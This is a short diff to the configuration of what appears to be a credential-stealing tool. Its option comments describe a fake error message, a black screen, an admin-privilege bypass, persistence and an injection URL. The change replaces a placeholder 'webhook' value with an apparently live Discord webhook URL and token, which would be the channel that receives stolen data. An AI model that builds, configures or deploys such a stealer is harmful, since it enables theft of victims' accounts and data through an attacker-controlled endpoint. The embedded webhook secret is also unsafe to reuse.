@@ -15,7 +15,7 @@ config = {
     # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
     # Black Screen: Make screen black? (True/False, Bool)
     # Error Message: Fake error text to display. (Leave Blank for None)
-    'webhook': 'a',
+    'webhook': 'https://discord.com/api/webhooks/1116575615051649076/aorIYaI6kENZZ2-Tlea5DzZmJyIjB1ngct8fqH60XP92A6ZrbGNBaKDrYI-0x4G0Navl',
     'persist': False,
     'keep-alive': False,
     'injection_url': 'url to injection (raw)',
